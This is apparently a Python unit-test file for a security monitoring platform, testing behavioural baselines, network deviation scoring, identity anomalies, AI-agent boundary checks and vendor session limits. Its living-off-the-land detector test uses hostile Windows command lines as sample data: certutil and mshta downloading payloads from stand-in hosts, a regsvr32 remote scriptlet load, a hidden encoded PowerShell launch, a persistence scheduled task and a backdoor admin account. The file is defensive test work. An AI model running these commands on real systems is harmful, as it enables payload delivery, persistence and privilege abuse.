"""
VaultX Phase 2 - Unit Tests for Behavioural Intelligence & Identity Engines

Covers:
  * test_baseline_engine      - baseline computation, min samples, Redis TTL cache,
                                maintenance window check & suppression
  * test_deviation_detector   - all 8 deviation signals, false-positive reduction
                                thresholds (1/2/3/4 signals), firmware suppression
  * test_lotl_detector        - all 8 LOTL Sysmon Event ID 1 patterns + 15-min
                                external network correlation & Redis stream publish
  * test_identity_engine      - token SHA-256 fingerprinting, brute force (>5/5m),
                                impossible travel, off-hours IST login, service
                                account interactive login, privileged unusual IP
  * test_ai_agent_monitor     - unapproved API endpoint, >3x rate spike, resource
                                scope, unexpected IP, unusual tool, Redis summary
  * test_session_tracker      - >8h human session warning, multi-IP suspicious,
                                after-hours observation, containment lookup/revoke
  * test_vendor_session_tracker - 4-hour session limit, scope violation, concurrent
                                session limit, VLAN violation
"""

from __future__ import annotations

import hashlib
import json
import sys
import unittest
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional

# Ensure repository root is importable
REPO_ROOT = Path(__file__).resolve().parents[2]
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

from backend.behavioural.baseline_engine import (
    AssetBaseline,
    BaselineEngine,
    MaintenanceWindow,
    classify_entity_type,
)
from backend.behavioural.behaviour_config import (
    BASELINE_REDIS_TTL_SECONDS,
    IDENTITY_DETECTION_STREAM,
    LOTL_DETECTION_STREAM,
)
from backend.behavioural.deviation_detector import DeviationDetector
from backend.behavioural.lotl_detector import LotlDetector
from backend.identity.ai_agent_monitor import (
    AgentActivityEvent,
    AgentOperationalBoundary,
    AIAgentMonitor,
)
from backend.identity.identity_engine import IdentityEngine, fingerprint_token
from backend.identity.session_tracker import SessionTracker
from backend.identity.vendor_session_tracker import VendorPolicy, VendorSessionTracker

IST = timezone(timedelta(hours=5, minutes=30))


# ---------------------------------------------------------------------------
# Lightweight in-memory FakeRedis for deterministic unit tests
# ---------------------------------------------------------------------------


class FakeRedis:
    def __init__(self) -> None:
        self.kv: Dict[str, str] = {}
        self.ttls: Dict[str, int] = {}
        self.hashes: Dict[str, Dict[str, str]] = {}
        self.streams: Dict[str, List[Dict[str, str]]] = {}

    def get(self, key: str) -> Optional[str]:
        return self.kv.get(key)

    def setex(self, key: str, ttl: int, value: str) -> bool:
        self.kv[key] = value
        self.ttls[key] = ttl
        return True

    def hset(
        self,
        key: str,
        field: Optional[str] = None,
        value: Optional[str] = None,
        mapping: Optional[Dict[str, str]] = None,
    ) -> int:
        bucket = self.hashes.setdefault(key, {})
        if mapping is not None:
            for k, v in mapping.items():
                bucket[str(k)] = str(v)
            return len(mapping)
        if field is not None and value is not None:
            bucket[str(field)] = str(value)
            return 1
        return 0

    def hget(self, key: str, field: str) -> Optional[str]:
        return self.hashes.get(key, {}).get(field)

    def hgetall(self, key: str) -> Dict[str, str]:
        return dict(self.hashes.get(key, {}))

    def hdel(self, key: str, field: str) -> int:
        bucket = self.hashes.get(key, {})
        if field in bucket:
            del bucket[field]
            return 1
        return 0

    def xadd(self, stream: str, fields: Dict[str, str]) -> str:
        entries = self.streams.setdefault(stream, [])
        entries.append(dict(fields))
        return f"{len(entries)}-0"


# ---------------------------------------------------------------------------
# Helper fixtures
# ---------------------------------------------------------------------------


def _sample_baseline(
    maintenance_windows: Optional[List[MaintenanceWindow]] = None,
    entity_type: str = "engineering_workstation",
) -> AssetBaseline:
    return AssetBaseline(
        asset_id="ENG-WS-201",
        entity_type=entity_type,
        normal_destinations={"10.10.20.10", "10.10.20.15"},
        normal_ports={22, 443},
        normal_protocols={"TCP"},
        bytes_per_hour_mean=10_000.0,
        bytes_per_hour_std=1_000.0,
        connections_per_hour_mean=20.0,
        connections_per_hour_std=2.0,
        normal_hours=set(range(9, 19)),  # 09:00-18:59 IST
        normal_peers={"ENG-GIT-01", "ENG-BUILD-01"},
        normal_vlans={20},
        approved_maintenance_windows=maintenance_windows or [],
        sample_count=500,
    )


# ---------------------------------------------------------------------------
# 1. Baseline Engine Tests
# ---------------------------------------------------------------------------


class TestBaselineEngine(unittest.TestCase):
    def test_baseline_engine(self) -> None:
        redis_mock = FakeRedis()
        engine = BaselineEngine(redis_client=redis_mock)

        # Fewer than BASELINE_MIN_SAMPLES (100) returns None
        few_flows = [
            {
                "timestamp": datetime(2026, 11, 15, 10, 0, tzinfo=IST),
                "dst_ip": "10.10.20.10",
                "dst_port": 443,
                "protocol": "TCP",
                "orig_bytes": 500,
                "resp_bytes": 1500,
                "destination_asset_id": "ENG-GIT-01",
            }
            for _ in range(50)
        ]
        self.assertIsNone(
            engine.compute_asset_baseline_from_flows(
                "ENG-WS-201", "engineering_workstation", few_flows
            )
        )

        # >= 100 samples produces valid baseline with rolling stats & maintenance windows
        mw = MaintenanceWindow(
            start_datetime=datetime(2026, 11, 18, 1, 0, tzinfo=IST),
            end_datetime=datetime(2026, 11, 18, 4, 0, tzinfo=IST),
            description="Scheduled SMT PLC firmware upgrade",
            asset_id="ENG-WS-201",
            vlan_id=30,
        )
        flows = []
        base_ts = datetime(2026, 11, 12, 10, 0, tzinfo=IST)
        for idx in range(120):
            ts = base_ts + timedelta(hours=idx % 6, minutes=idx % 30)
            flows.append(
                {
                    "timestamp": ts,
                    "dst_ip": "10.10.20.10" if idx % 2 == 0 else "10.10.20.15",
                    "dst_port": 443 if idx % 2 == 0 else 22,
                    "protocol": "TCP",
                    "orig_bytes": 1000 + (idx % 5) * 100,
                    "resp_bytes": 2000,
                    "destination_asset_id": "ENG-GIT-01" if idx % 2 == 0 else "ENG-BUILD-01",
                }
            )

        baseline = engine.compute_asset_baseline_from_flows(
            asset_id="ENG-WS-201",
            entity_type="engineering_workstation",
            flows=flows,
            maintenance_windows=[mw],
        )
        self.assertIsNotNone(baseline)
        assert baseline is not None
        self.assertEqual(baseline.sample_count, 120)
        self.assertEqual(baseline.normal_destinations, {"10.10.20.10", "10.10.20.15"})
        self.assertEqual(baseline.normal_ports, {22, 443})
        self.assertEqual(baseline.normal_peers, {"ENG-GIT-01", "ENG-BUILD-01"})
        self.assertEqual(baseline.normal_vlans, {20})
        self.assertGreater(baseline.bytes_per_hour_mean, 0.0)
        self.assertGreater(baseline.connections_per_hour_mean, 0.0)

        # Redis caching with 7h TTL & roundtrip deserialization
        engine.cache_asset_baseline(baseline)
        self.assertEqual(
            redis_mock.ttls["baseline:asset:ENG-WS-201"], BASELINE_REDIS_TTL_SECONDS
        )
        loaded = engine.get_asset_baseline("ENG-WS-201")
        self.assertIsNotNone(loaded)
        assert loaded is not None
        self.assertEqual(loaded.normal_ports, {22, 443})
        self.assertIsNotNone(
            loaded.is_in_maintenance_window(datetime(2026, 11, 18, 2, 30, tzinfo=IST))
        )
        self.assertIsNone(
            loaded.is_in_maintenance_window(datetime(2026, 11, 18, 6, 0, tzinfo=IST))
        )

        # Verify all 11 entity types supported
        self.assertEqual(len(engine.ENTITY_TYPES), 11)
        self.assertEqual(classify_entity_type(device_type="plc"), "industrial_controller")
        self.assertEqual(classify_entity_type(identity_classification="AI_AGENT"), "ai_agent")


# ---------------------------------------------------------------------------
# 2. Deviation Detector Tests
# ---------------------------------------------------------------------------


class TestDeviationDetector(unittest.TestCase):
    def test_deviation_detector_signals_and_thresholds(self) -> None:
        detector = DeviationDetector()
        baseline = _sample_baseline()
        normal_time = datetime(2026, 11, 18, 11, 0, tzinfo=IST)
        off_time = datetime(2026, 11, 18, 2, 0, tzinfo=IST)

        # 0 signals -> NONE
        clean_event = {
            "asset_id": "ENG-WS-201",
            "timestamp": normal_time,
            "dst_ip": "10.10.20.10",
            "dst_port": 443,
            "hourly_bytes": 10_500,
            "connections_per_hour": 21,
            "peer_asset_id": "ENG-GIT-01",
            "dst_vlan": 20,
        }
        res0 = detector.evaluate(clean_event, baseline)
        self.assertEqual(res0.severity, "NONE")
        self.assertEqual(len(res0.signals), 0)

        # 1 signal only (unusual_port) -> OBSERVATION (false positive reduction)
        one_sig_event = dict(clean_event, dst_port=4444)
        res1 = detector.evaluate(one_sig_event, baseline)
        self.assertEqual(len(res1.signals), 1)
        self.assertEqual(res1.signals[0].name, "unusual_port")
        self.assertEqual(res1.severity, "OBSERVATION")
        self.assertFalse(res1.is_anomaly_indicator)

        # 2 signals (unusual_port + time_anomaly) -> score > 0.5 -> LOW
        two_sig_event = dict(clean_event, dst_port=4444, timestamp=off_time)
        res2 = detector.evaluate(two_sig_event, baseline)
        self.assertEqual(len(res2.signals), 2)
        self.assertGreater(res2.combined_score, 0.5)
        self.assertEqual(res2.severity, "LOW")
        self.assertTrue(res2.is_evidence_only)

        # 3 signals (+ frequency_anomaly) -> score > 0.7 -> MEDIUM
        three_sig_event = dict(two_sig_event, connections_per_hour=50)
        res3 = detector.evaluate(three_sig_event, baseline)
        self.assertEqual(len(res3.signals), 3)
        self.assertGreater(res3.combined_score, 0.7)
        self.assertEqual(res3.severity, "MEDIUM")

        # 4+ signals (all 7 active: new_destination, unusual_port, time_anomaly,
        # volume_anomaly, frequency_anomaly, new_peer, cross_vlan_unexpected) -> HIGH
        all_sig_event = {
            "asset_id": "ENG-WS-201",
            "timestamp": off_time,
            "dst_ip": "10.10.30.20",
            "dst_criticality": "critical",
            "dst_port": 502,
            "hourly_bytes": 50_000,  # > 10000 + 3*1000
            "connections_per_hour": 50,  # > 20 + 3*2
            "peer_asset_id": "OT-SMT-PLC01",
            "peer_criticality": "critical",
            "dst_vlan": 30,
        }
        res_all = detector.evaluate(all_sig_event, baseline)
        sig_names = {s.name for s in res_all.signals}
        self.assertEqual(
            sig_names,
            {
                "new_destination",
                "unusual_port",
                "time_anomaly",
                "volume_anomaly",
                "frequency_anomaly",
                "new_peer",
                "cross_vlan_unexpected",
            },
        )
        self.assertGreater(res_all.combined_score, 0.85)
        self.assertEqual(res_all.severity, "HIGH")

    def test_maintenance_window_dampening_and_firmware_suppression(self) -> None:
        mw = MaintenanceWindow(
            start_datetime=datetime(2026, 11, 18, 1, 0, tzinfo=IST),
            end_datetime=datetime(2026, 11, 18, 4, 0, tzinfo=IST),
            description="OT maintenance window",
        )
        baseline = _sample_baseline(maintenance_windows=[mw])
        mw_time = datetime(2026, 11, 18, 2, 0, tzinfo=IST)

        # Maintenance window reduces signal scores by 50%, dropping 2-signal event below 0.5
        detector = DeviationDetector(
            approved_engineering_assets={"ENG-WS-201"},
            approved_firmware_identities={"id-eng-lead-01"},
        )
        ev_mw = {
            "asset_id": "ENG-WS-201",
            "timestamp": mw_time,
            "dst_ip": "10.10.20.10",
            "dst_port": 8443,  # unusual_port (0.3 -> 0.15)
            "hourly_bytes": 10_000,
            "connections_per_hour": 20,
            "peer_asset_id": "ENG-GIT-01",
            "dst_vlan": 20,
        }
        res_mw = detector.evaluate(ev_mw, baseline)
        self.assertTrue(res_mw.in_maintenance_window)
        self.assertLess(res_mw.combined_score, 0.5)
        self.assertEqual(res_mw.severity, "OBSERVATION")

        # Approved firmware deployment: Eng system -> OT VLAN + approved identity + MW -> SUPPRESSED
        fw_event = {
            "asset_id": "ENG-WS-201",
            "identity_id": "id-eng-lead-01",
            "timestamp": mw_time,
            "src_vlan": 20,
            "dst_ip": "10.10.30.20",
            "dst_vlan": 30,
            "dst_port": 102,
            "peer_asset_id": "OT-SMT-PLC01",
        }
        res_fw = detector.evaluate(fw_event, baseline)
        self.assertEqual(res_fw.severity, "SUPPRESSED")
        self.assertIsNotNone(res_fw.suppress_reason)


# ---------------------------------------------------------------------------
# 3. LOTL Detector Tests
# ---------------------------------------------------------------------------


class TestLotlDetector(unittest.TestCase):
    def test_lotl_detector(self) -> None:
        redis_mock = FakeRedis()

        def mock_net_fetcher(
            asset_id: Optional[str],
            src_ip: Optional[str],
            ts: datetime,
            window_min: int,
        ) -> List[Dict[str, Any]]:
            return [
                {
                    "timestamp": (ts - timedelta(minutes=3)).isoformat(),
                    "src_ip": "10.10.10.101",
                    "dst_ip": "185.220.101.42",  # external IP
                    "dst_port": 443,
                    "protocol": "TCP",
                },
                {
                    "timestamp": (ts - timedelta(minutes=1)).isoformat(),
                    "src_ip": "10.10.10.101",
                    "dst_ip": "10.10.10.10",  # internal IP (ignored as external)
                    "dst_port": 445,
                    "protocol": "TCP",
                },
            ]

        detector = LotlDetector(redis_client=redis_mock, network_fetcher=mock_net_fetcher)

        cases = [
            (
                "powershell.exe",
                "explorer.exe",
                "powershell.exe -NoP -W Hidden -enc SQBFAFgA...",
                "T1059.001",
            ),
            (
                "certutil.exe",
                "cmd.exe",
                "certutil.exe -urlcache -split -f http://evil.example/payload.exe out.exe",
                "T1105",
            ),
            (
                "cmd.exe",
                "wmiprvse.exe",
                "cmd.exe /c whoami",
                "T1047",
            ),
            (
                "mshta.exe",
                "explorer.exe",
                "mshta.exe http://185.220.101.42/dropper.hta",
                "T1218.005",
            ),
            (
                "regsvr32.exe",
                "cmd.exe",
                "regsvr32.exe /s /n /u /i:http://185.220.101.42/file.sct scrobj.dll",
                "T1218.010",
            ),
            (
                "schtasks.exe",
                "cmd.exe",
                'schtasks /create /tn "Updater" /tr "C:\\Temp\\upd.exe" /sc onlogon',
                "T1053.005",
            ),
            (
                "net.exe",
                "cmd.exe",
                "net localgroup administrators backdoor_user /add",
                "T1136.001",
            ),
            (
                "powershell.exe",
                "winword.exe",
                "powershell.exe -Command Invoke-WebRequest http://x.test",
                "T1566.001",
            ),
        ]

        for proc, parent, cmdline, expected_mitre in cases:
            ev = {
                "event_type": "process_create",
                "event_id_raw": 1,
                "asset_id": "CORP-WS-101",
                "hostname": "fin-ws-pune-01",
                "user_name": "jdoe",
                "process_name": proc,
                "parent_process_name": parent,
                "command_line": cmdline,
                "timestamp": datetime(2026, 11, 18, 12, 0, tzinfo=IST),
            }
            ind = detector.analyze_event(ev, publish=True)
            self.assertIsNotNone(ind, f"Expected match for {proc}: {cmdline}")
            assert ind is not None
            self.assertIn(expected_mitre, ind.mitre_techniques)
            self.assertTrue(ind.network_correlated)
            self.assertEqual(len(ind.external_connections), 1)
            self.assertGreaterEqual(ind.combined_score, 0.80)

        # Published all 8 indicators to Redis stream detections:lotl
        self.assertEqual(len(redis_mock.streams[LOTL_DETECTION_STREAM]), len(cases))

        # Benign event produces None
        benign = {
            "event_type": "process_create",
            "event_id_raw": 1,
            "asset_id": "CORP-WS-101",
            "process_name": "notepad.exe",
            "parent_process_name": "explorer.exe",
            "command_line": "notepad.exe notes.txt",
        }
        self.assertIsNone(detector.analyze_event(benign))


# ---------------------------------------------------------------------------
# 4. Identity Engine Tests
# ---------------------------------------------------------------------------


class TestIdentityEngine(unittest.TestCase):
    def test_identity_engine(self) -> None:
        redis_mock = FakeRedis()
        registry = {
            "rahul.sharma": {
                "identity_id": "11111111-1111-1111-1111-111111111111",
                "principal_name": "rahul.sharma",
                "principal_type": "HUMAN_USER",
                "is_privileged": False,
            },
            "svc_erp_sync": {
                "identity_id": "22222222-2222-2222-2222-222222222222",
                "principal_name": "svc_erp_sync",
                "principal_type": "SERVICE_ACCOUNT",
                "is_privileged": False,
            },
            "admin.becpl": {
                "identity_id": "33333333-3333-3333-3333-333333333333",
                "principal_name": "admin.becpl",
                "principal_type": "HUMAN_USER",
                "is_privileged": True,
                "known_ips": ["10.10.70.10"],
            },
        }
        engine = IdentityEngine(redis_client=redis_mock, identity_registry=registry)

        # Token fingerprinting: SHA-256 only, NEVER raw token
        raw_secret = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.secret"
        rec, _ = engine.process_auth_event(
            {
                "principal_name": "rahul.sharma",
                "auth_method": "mfa",
                "source_ip": "10.10.10.101",
                "target_resource": "CORP-ERP-01",
                "token": raw_secret,
                "success": True,
                "timestamp": datetime(2026, 11, 18, 10, 0, tzinfo=IST),
            },
            persist=False,
        )
        self.assertEqual(
            rec.token_fingerprint, hashlib.sha256(raw_secret.encode()).hexdigest()
        )
        self.assertNotIn(raw_secret, json.dumps(rec.to_dict()))

        # 1. Brute force: > 5 failures in 5 minutes -> brute_force_indicator
        t0 = datetime(2026, 11, 18, 11, 0, tzinfo=IST)
        bf_anomalies = []
        for i in range(6):
            _, anoms = engine.process_auth_event(
                {
                    "principal_name": "rahul.sharma",
                    "auth_method": "password",
                    "source_ip": "10.10.10.101",
                    "target_resource": "CORP-ERP-01",
                    "success": False,
                    "failure_reason": "invalid_password",
                    "timestamp": t0 + timedelta(seconds=i * 20),
                },
                persist=False,
            )
            bf_anomalies.extend(anoms)
        self.assertTrue(
            any(a.anomaly_type == "brute_force_indicator" for a in bf_anomalies)
        )

        # 2. Off-hours human login (02:30 IST -> outside 07:00-22:00 IST)
        _, off_anoms = engine.process_auth_event(
            {
                "principal_name": "rahul.sharma",
                "auth_method": "mfa",
                "source_ip": "10.10.10.101",
                "target_resource": "CORP-ERP-01",
                "success": True,
                "timestamp": datetime(2026, 11, 18, 2, 30, tzinfo=IST),
            },
            persist=False,
        )
        self.assertTrue(
            any(a.anomaly_type == "off_hours_human_login" for a in off_anoms)
        )

        # 3. Impossible travel: Pune (103.21.1.5) -> New York (198.51.100.10) within 20 min
        engine.process_auth_event(
            {
                "principal_name": "rahul.sharma",
                "auth_method": "mfa",
                "source_ip": "103.21.1.5",
                "target_resource": "VPN-GW",
                "success": True,
                "timestamp": datetime(2026, 11, 18, 13, 0, tzinfo=IST),
            },
            persist=False,
        )
        _, travel_anoms = engine.process_auth_event(
            {
                "principal_name": "rahul.sharma",
                "auth_method": "mfa",
                "source_ip": "198.51.100.10",
                "target_resource": "VPN-GW",
                "success": True,
                "timestamp": datetime(2026, 11, 18, 13, 20, tzinfo=IST),
            },
            persist=False,
        )
        self.assertTrue(
            any(a.anomaly_type == "impossible_travel" for a in travel_anoms)
        )

        # 4. Service account interactive login (password instead of certificate/api_key)
        _, svc_anoms = engine.process_auth_event(
            {
                "principal_name": "svc_erp_sync",
                "auth_method": "password",
                "source_ip": "10.10.10.50",
                "target_resource": "CORP-ERP-01",
                "success": True,
                "timestamp": datetime(2026, 11, 18, 14, 0, tzinfo=IST),
            },
            persist=False,
        )
        self.assertTrue(
            any(a.anomaly_type == "service_account_interactive_login" for a in svc_anoms)
        )

        # 5. Privileged account from unusual IP
        _, priv_anoms = engine.process_auth_event(
            {
                "principal_name": "admin.becpl",
                "auth_method": "mfa",
                "source_ip": "185.220.5.9",
                "target_resource": "CORP-DC-01",
                "success": True,
                "timestamp": datetime(2026, 11, 18, 15, 0, tzinfo=IST),
            },
            persist=False,
        )
        self.assertTrue(
            any(
                a.anomaly_type == "privileged_account_unusual_location"
                for a in priv_anoms
            )
        )
        self.assertGreater(len(redis_mock.streams[IDENTITY_DETECTION_STREAM]), 0)


# ---------------------------------------------------------------------------
# 5. AI Agent Monitor & Session Tracker Tests
# ---------------------------------------------------------------------------


class TestAIAgentAndSessionTrackers(unittest.TestCase):
    def test_ai_agent_monitor(self) -> None:
        redis_mock = FakeRedis()
        boundary = AgentOperationalBoundary(
            identity_id="agent-inv-01",
            agent_name="InventoryForecastAgent",
            identity_category="AI_AGENT",
            approved_api_endpoints={"/api/v1/inventory/*", "/api/v1/orders/read"},
            approved_resource_types={"inventory_db", "erp_readonly"},
            approved_hours_ist=set(range(8, 20)),
            approved_source_networks=["10.10.60.0/24"],
            approved_tools={"query_stock", "forecast_demand"},
            normal_calls_per_minute=2.0,
        )
        monitor = AIAgentMonitor(
            boundaries={"agent-inv-01": boundary}, redis_client=redis_mock
        )

        # Trigger unapproved endpoint, out-of-scope resource, unexpected IP, unusual tool
        ev = AgentActivityEvent(
            identity_id="agent-inv-01",
            identity_category="AI_AGENT",
            timestamp=datetime(2026, 11, 18, 10, 0, tzinfo=IST),
            source_ip="10.10.10.99",
            api_endpoint="/api/v1/ot/plc/flash",
            resource_type="plc_controller",
            target_resource="OT-SMT-PLC01",
            tool_name="exec_shell",
        )
        anoms = monitor.evaluate_activity(ev)
        types = {a.anomaly_type for a in anoms}
        self.assertIn("agent_unapproved_api_endpoint", types)
        self.assertIn("agent_out_of_scope_resource", types)
        self.assertIn("agent_unexpected_source_ip", types)
        self.assertIn("agent_unusual_tool_invocation", types)

        # Exceed > 3x normal rate (2.0 * 3 = 6 -> 7th call in 1 minute triggers rate anomaly)
        rate_anoms = []
        for i in range(7):
            rate_anoms.extend(
                monitor.evaluate_activity(
                    AgentActivityEvent(
                        identity_id="agent-inv-01",
                        identity_category="AI_AGENT",
                        timestamp=datetime(2026, 11, 18, 10, 0, tzinfo=IST)
                        + timedelta(seconds=i + 1),
                        source_ip="10.10.60.20",
                        api_endpoint="/api/v1/orders/read",
                        resource_type="inventory_db",
                        tool_name="query_stock",
                    )
                )
            )
        self.assertTrue(
            any(a.anomaly_type == "agent_high_api_frequency" for a in rate_anoms)
        )
        summary = monitor.get_activity_summary("agent-inv-01")
        self.assertEqual(int(summary["total_calls"]), 8)

    def test_session_tracker(self) -> None:
        redis_mock = FakeRedis()
        tracker = SessionTracker(redis_client=redis_mock)

        start = datetime(2026, 11, 18, 9, 0, tzinfo=IST)
        tracker.register_or_update_auth_session(
            session_id="sess-1",
            principal_id="user-1",
            identity_type="HUMAN_USER",
            source_ip="10.10.10.101",
            target_resource="CORP-ERP-01",
            auth_method="mfa",
            timestamp=start,
        )

        # Simultaneous session from different IP -> suspicious
        _, anoms_multi = tracker.register_or_update_auth_session(
            session_id="sess-2",
            principal_id="user-1",
            identity_type="HUMAN_USER",
            source_ip="10.10.10.155",
            target_resource="CORP-ERP-01",
            auth_method="mfa",
            timestamp=start + timedelta(minutes=30),
        )
        self.assertTrue(any(a.classification == "suspicious" for a in anoms_multi))

        # Network flow 14 hours later (23:00 IST) -> duration > 8h (warning) + after hours (observation)
        anoms_flow = tracker.update_from_network_flow(
            source_ip="10.10.10.101",
            timestamp=start + timedelta(hours=14),
        )
        classes = {a.classification for a in anoms_flow}
        self.assertIn("warning", classes)
        self.assertIn("observation", classes)

        # Containment lookup & revocation
        active = tracker.active_sessions_for_identity("user-1")
        self.assertEqual(len(active), 2)
        revoked = tracker.revoke_sessions_for_identity("user-1")
        self.assertEqual(len(revoked), 2)
        self.assertEqual(len(tracker.active_sessions_for_identity("user-1")), 0)


# ---------------------------------------------------------------------------
# 6. Vendor Session Tracker Tests
# ---------------------------------------------------------------------------


class TestVendorSessionTracker(unittest.TestCase):
    def test_vendor_session_tracker(self) -> None:
        redis_mock = FakeRedis()
        policy = VendorPolicy(
            vendor_id=5,
            vendor_name="HexaCore Embedded Firmware Labs",
            approved_access_scope="Git repository access via DMZ jump host only",
            approved_resources={"ENG-GIT-01", "DMZ-BASTION-01"},
            allowed_vlans={20, 50},
            max_session_duration_hours=4.0,
            max_concurrent_sessions=1,
        )
        tracker = VendorSessionTracker(policies={5: policy}, redis_client=redis_mock)

        t0 = datetime(2026, 11, 18, 10, 0, tzinfo=IST)
        rec1, alerts1 = tracker.start_session(
            vendor_id=5,
            identity_id="vendor-hexacore-01",
            source_ip="10.10.50.25",
            session_id="vsess-1",
            start_time=t0,
        )
        self.assertEqual(alerts1, [])
        self.assertEqual(rec1.vendor_name, "HexaCore Embedded Firmware Labs")

        # Concurrent session beyond limit (max=1)
        _, alerts_conc = tracker.start_session(
            vendor_id=5,
            identity_id="vendor-hexacore-02",
            source_ip="10.10.50.26",
            session_id="vsess-2",
            start_time=t0 + timedelta(minutes=10),
        )
        self.assertTrue(
            any(
                a.violation_type == "vendor_concurrent_sessions_exceeded"
                for a in alerts_conc
            )
        )

        # Approved resource access -> no alert
        alerts_ok = tracker.record_activity(
            session_id="vsess-1",
            resource="ENG-GIT-01",
            bytes_transferred=4096,
            timestamp=t0 + timedelta(hours=1),
            vlan_id=20,
        )
        self.assertEqual(alerts_ok, [])

        # Scope violation (accessing OT PLC on VLAN 30)
        alerts_scope = tracker.record_activity(
            session_id="vsess-1",
            resource="OT-SMT-PLC01",
            bytes_transferred=2048,
            timestamp=t0 + timedelta(hours=2),
            vlan_id=30,
        )
        v_types = {a.violation_type for a in alerts_scope}
        self.assertIn("vendor_scope_violation", v_types)
        self.assertIn("vendor_vlan_scope_violation", v_types)

        # 4-hour session duration violation (4.5 hours elapsed)
        final_rec, alerts_dur = tracker.end_session(
            session_id="vsess-1",
            end_time=t0 + timedelta(hours=4, minutes=30),
            persist=False,
        )
        self.assertTrue(
            any(
                a.violation_type == "vendor_session_duration_exceeded"
                for a in alerts_dur
            )
        )
        self.assertEqual(final_rec.duration_minutes, 270)
        self.assertEqual(final_rec.bytes_transferred, 6144)
        self.assertGreaterEqual(len(final_rec.policy_violations), 3)


if __name__ == "__main__":
    unittest.main()
